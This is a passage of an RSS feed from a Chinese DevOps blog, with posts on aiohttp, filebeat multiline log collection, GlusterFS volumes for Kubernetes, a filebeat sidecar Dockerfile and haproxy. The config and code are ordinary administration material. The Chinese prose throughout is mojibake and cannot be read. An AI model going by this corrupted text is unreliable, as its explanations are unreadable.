&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;aiohttp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ClientSession&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åä¸€è¡Œ await æ˜¯æŒ‚èµ·å‘½ä»¤ï¼ŒæŒ‚èµ·å½“å‰å‡½æ•° get() ï¼Œå¹¶æ‰§è¡Œ response.text() å’Œæ³¨å†Œå›è°ƒï¼Œç­‰å¾… response.text() æ‰§è¡Œå®Œæˆåé‡æ–°æ¿€æ´»å½“å‰å‡½æ•¸get()ç»§ç»­æ‰§è¡Œï¼Œè¿”å›ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesä½¿ç”¨filebeat multilineè‡ªå®šä¹‰æ”¶é›†æ—¥å¿—</title>
      <link>https://rendoumi.com/posts/20211111-k8s_filebeat/</link>
      <pubDate>Thu, 11 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211111-k8s_filebeat/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•åœ¨ kubernetes ç¯å¢ƒä¸­ä½¿ç”¨ filebeat sidecar æ–¹å¼æ”¶é›†æ—¥å¿—&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨çš„æ˜¯ filebeat çš„ moudle æ¨¡å—ï¼Œä½†å‡¡æ˜¯å¸¸ç”¨çš„è½¯ä»¶ï¼ŒåŸºæœ¬éƒ½æœ‰å¯¹åº”çš„æ¨¡å—å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆåº”è¯¥ä½¿ç”¨æ¨¡å—æ¥æ”¶é›†æ—¥å¿—ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å¯¹äºä¸€äº›æˆ‘ä»¬è‡ªå·±å†™çš„ Go è½¯ä»¶å‘¢ï¼Œæˆ–è€…æ ¹æœ¬ä¸æ˜¯æ ‡å‡†çš„ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é‚£å°±è‡ªå®šä¹‰ filebeat.inputsï¼Œç½‘ä¸Šçš„ filebeat ä¾‹å­ï¼Œå…¶å®å¤§å¤šéƒ½æ˜¯è¿™æ ·çš„&lt;/p&gt;
&lt;p&gt;å¾ˆç®€å•ï¼Œç»™ä¸ªä¾‹å­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[beat-logstash-some-name-832-2015.11.28] IndexNotFoundException[no such index]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:566)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:133)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:77)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;at org.elasticsearch.action.admin..checkBlock(TransportDeleteIndexAction.java:75)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹å¦‚ä¸Šæ—¥å¿—ï¼Œå¦‚æœä¸ç”¨æ¨¡å¼åŒ¹é…çš„è¯ï¼Œé‚£ä¹ˆä¼šé€5æ¡è®°å½•åˆ° ESï¼Œ Kibana çœ‹èµ·æ¥å°±ååˆ†å‰²è£‚äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥è¦ç”¨æ­£åˆ™æŠŠåº•ä¸‹çš„4è¡Œå’Œä¸Šé¢çš„ç¬¬1è¡Œåˆåœ¨ä¸€èµ·ï¼Œåˆå¹¶æˆä¸€æ¡å°±è®°å½•æ¨é€åˆ° ES å»&lt;/p&gt;
&lt;p&gt;ä»”ç»†è§‚å¯Ÿï¼Œå¼€å¤´ä¸€è¡Œæ˜¯ä»¥ [ å¼€å§‹çš„ï¼Œæ‰€ä»¥æ­£åˆ™å°±æ˜¯ &amp;lsquo;^\[&amp;rsquo;ï¼Œæˆ‘ä»¬è¦åŒ¹é…çš„æ˜¯åº•ä¸‹çš„4è¡Œï¼Œå¿…é¡»åè½¬ä¸€ä¸‹æ¨¡å¼ã€‚&lt;/p&gt;
&lt;p&gt;multiline çš„ negate å±æ€§ï¼Œè¿™ä¸ªæ˜¯æŒ‡å®šæ˜¯å¦åè½¬åŒ¹é…åˆ°çš„å†…å®¹ï¼Œè¿™é‡Œå¦‚æœæ˜¯ true çš„è¯ï¼Œåè½¬ï¼Œé‚£å°±æ˜¯é€‰æ‹©ä¸ä»¥ [ å¼€å¤´çš„è¡Œã€‚ netgate å±æ€§çš„ç¼ºçœå€¼æ˜¯ false&lt;/p&gt;
&lt;p&gt;multiline çš„ match å±æ€§ï¼Œafter æŒ‡è¿½åŠ åˆ°ä¸Šä¸€æ¡äº‹ä»¶ï¼ˆå‘ä¸Šåˆå¹¶ï¼‰ï¼Œbefore æŒ‡åˆå¹¶åˆ°ä¸‹ä¸€æ¡ï¼ˆå‘ä¸‹åˆå¹¶ï¼‰&lt;/p&gt;
&lt;p&gt;äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºä»¥ä¸‹çš„åŒ¹é…æ¨¡å¼ï¼Œè¿™æ ·å°±æŠŠåŒ¹é…åˆ°æ¡ç›®è¿½åŠ åˆ°ä¸Šä¸€æ¡ï¼Œåˆå¹¶åœ¨ä¸€èµ·äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;filebeat.inputs:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;- type: log&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;enabled: true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;paths:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;na&#34;&gt;- /Users/liuxg/data/multiline/multiline.log&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;multiline.type: pattern&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;multiline.pattern: &amp;#39;^\[&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;multiline.negate: true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;multiline.match: after&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;output.elasticsearch:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;na&#34;&gt;hosts: [&amp;#34;localhost:9200&amp;#34;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;na&#34;&gt;index: &amp;#34;multiline&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†ç»™ä¸ªä¾‹å­ï¼Œjava çš„ stack è°ƒç”¨ï¼Œæ—¥å¿—æ ¼å¼å¦‚ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”Ÿäº§ç¯å¢ƒkubernetesä½¿ç”¨æŒä¹…åŒ–å·GlusterFS</title>
      <link>https://rendoumi.com/posts/20211110-k8s_gfs/</link>
      <pubDate>Wed, 10 Nov 2021 12:50:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211110-k8s_gfs/</guid>
      <description>&lt;p&gt;åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ Kubernetes ï¼Œç»•ä¸è¿‡å»çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æŒä¹…åŒ–å·ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæ˜¯ä½¿ç”¨é˜¿é‡Œ ACK æ‰˜ç®¡å¹³å°çš„è¯ï¼Œå¯ä»¥ç”¨ OSS æ¥æŒä¹…åŒ–å·ï¼Œå¦‚æœæ˜¯è‡ªæ­çš„ kubernetesï¼Œé‚£ä¹ˆå­˜å‚¨å°±éœ€è¦ä»”ç»†è€ƒè™‘äº†ã€‚&lt;/p&gt;
&lt;p&gt;cephæ¯”è¾ƒå¤æ‚ï¼Œå®¹æ˜“å‡ºæ•…éšœã€‚nfs ä¹Ÿä¸å¯ç”¨ï¼Œæ¯›ç—…å¤šå¤šã€‚minioå€’æ˜¯å¯ä»¥ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨åŒå‰¯æœ¬çš„ GlusterFS å°±æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚&lt;/p&gt;
&lt;p&gt;ç”Ÿäº§ç¯å¢ƒå°±ä¸èƒ½éšæ„äº†ï¼Œæœ€å¥½ä¸è¦ä½¿ç”¨ Heketiï¼Œå› ä¸ºå‡¡æ˜¯è¦æŒä¹…åŒ–çš„ä¸œè¥¿ï¼Œéƒ½æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ï¼Œæœ€å¥½éƒ½æœ‰ yaml è®°å½•ã€‚&lt;/p&gt;
&lt;p&gt;GlusterFS çš„æ­å»ºå°±ä¸è¯´äº†ã€‚è¯´è¯´å®é™…ä½¿ç”¨è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€è£…gfsç”Ÿäº§æ–°å·&#34;&gt;ä¸€ã€è£…GFSï¼Œç”Ÿäº§æ–°å·&lt;/h2&gt;
&lt;p&gt;å®‰è£…å°±ä¸è¯´äº†ï¼Œæˆ‘ä»¬çš„GFSæœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œ172.19.20.18 å’Œ 172.19.20.36ï¼Œæˆ‘ä»¬å¼ºåˆ¶å»ºç«‹ä¸€ä¸ªä¸¤å‰¯æœ¬çš„å·ï¼š kuaijian-vol&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume create kuaijian-vol replica &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; transport tcp 172.19.20.18:/glusterfs/kuaijian-vol 172.19.20.36:/glusterfs/kuaijian-vol force
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒä¸ºk8säº§ç”Ÿgfsçš„endingpointå’Œservice&#34;&gt;äºŒã€ä¸ºk8säº§ç”ŸGFSçš„endingpointå’Œservice&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; ep-svc.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;apiVersion: v1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;kind: Service
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  name: gfs-cluster_svc 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;spec:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  ports:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  - port: 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;apiVersion: v1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;kind: Endpoints
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  name: gfs-cluster_svc 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;subsets:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  - addresses:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      - ip: 172.19.20.18 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      - port: 1 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  - addresses:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      - ip: 172.19.20.36 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      - port: 1 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl apply -f ep-svc.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œè¦æä¸€ä¸ªæ¦‚å¿µï¼Œé€šå¸¸æƒ…å†µä¸‹ service æ˜¯é€šè¿‡ selector æ ‡ç­¾æ¥é€‰æ‹©å¯¹åº”çš„ pod æ¥å¢åŠ  endingpoint çš„ã€‚å¦‚ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesç”Ÿäº§ç¯å¢ƒä½¿ç”¨filebeat sidecaræ”¶é›†æ—¥å¿—</title>
      <link>https://rendoumi.com/posts/20211110-k8s_sidecar/</link>
      <pubDate>Wed, 10 Nov 2021 12:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211110-k8s_sidecar/</guid>
      <description>&lt;p&gt;åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒES é€šå¸¸æ˜¯ä¸ä¼šåœ¨ k8s é›†ç¾¤ä¸­å­˜åœ¨çš„ï¼Œä¸€èˆ¬ MySQL å’Œ Elasticsearch éƒ½æ˜¯ç‹¬ç«‹åœ¨ k8s ä¹‹å¤–ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ— è®ºå“ªç§ podï¼Œè¦ç”©æ—¥å¿—åˆ° ESï¼Œæœ€è½»é‡çš„æ–¹æ¡ˆè‚¯å®šæ˜¯ç”¨ filebeat ç”©è¿‡å»äº†ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œå¦‚æœæ˜¯é˜¿é‡Œçš„ ACKï¼Œlogtail å’Œ logstore é…æ­å·²ç»éå¸¸ä¸é”™äº†ï¼Œæ ¹æœ¬ç”¨ä¸åˆ° filebeat å’Œ ESã€‚&lt;/p&gt;
&lt;p&gt;å¯ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸æƒ³ä¸ºé˜¿é‡Œ slsã€logstore å‡ºé’±ä¹°å•ï¼Œå°±åªèƒ½ç”¨ filebeat + ES äº†&lt;/p&gt;
&lt;p&gt;è¯´ä¸€ä¸‹ filebeat çš„ sidecar è¾¹è½¦ï¼ˆåƒšæœºï¼‰ç”¨æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211110192939845&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211110-k8s_sidecar/image-20211110192939845.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç®€å•è¯´å°±æ˜¯èµ·ä¸€ä¸ª filebeat çš„ logging-agent è¾¹è½¦ï¼ˆåƒšæœºï¼‰ï¼Œè¾¹è½¦å’Œä¸»åº”ç”¨ä¹‹é—´å…±äº«æŸä¸ªæ–‡ä»¶å¤¹ï¼ˆmountPathï¼‰ï¼Œè¾¾åˆ°æ”¶é›†ä¸»åº”ç”¨æ—¥å¿—å¹¶å‘é€åˆ° ESï¼Œè€Œä¸ç”¨åŠ¨ app-container åˆ†æ¯«ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»¥éƒ¨ç½²ä¸€ä¸ª Tomcat åº”ç”¨ä¸ºä¾‹æ¥è¯´æ˜ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€æ‰“é€ -filebeat-è¾¹è½¦é•œåƒ&#34;&gt;ä¸€ã€æ‰“é€  filebeat è¾¹è½¦é•œåƒ&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆå‡†å¤‡ Dockerfile&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FROM alpine:3.12  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ARG VERSION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;7.15.1  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;COPY docker-entrypoint.sh /  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN set -x \  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;amp;&amp;amp; cd /tmp \  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;amp;&amp;amp; wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-${VERSION}-linux-x86_64.tar.gz \  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;amp;&amp;amp; tar xzvf filebeat-${VERSION}-linux-x86_64.tar.gz \  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;amp;&amp;amp; mv filebeat-${VERSION}-linux-x86_64 /opt \  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;amp;&amp;amp; rm /tmp/* \  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;amp;&amp;amp; chmod +x /docker-entrypoint.sh  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENV PATH $PATH:/opt/filebeat-${VERSION}-linux-x86_64  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;WORKDIR /opt/filebeat-${VERSION}-linux-x86_64  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENTRYPOINT [&amp;#34;/docker-entrypoint.sh&amp;#34;]  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ä»¥ alphine:3.12 ä¸ºåº•ç‰ˆï¼Œç„¶åä¸‹è½½ filebeat  7.15.1çš„äºŒè¿›åˆ¶åŒ…å¹¶é‡Šæ”¾åˆ° /opt ä¸‹ï¼Œæœ€åæŒ‡å®šå…¥å£æ–‡ä»¶ /docker-entrypoint.sh&lt;/p&gt;</description>
    </item>
    <item>
      <title>haproxyä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡</title>
      <link>https://rendoumi.com/posts/20211110-haproxy_multiple_port/</link>
      <pubDate>Wed, 10 Nov 2021 09:50:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211110-haproxy_multiple_port/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬é€‰æ‹© haproxy 1.8 ç‰ˆæœ¬ä»¥ä¸Šçš„ï¼Œç¼–è¯‘å®‰è£…åˆ°è·¯å¾„ /export/servers/haproxy&lt;/p&gt;
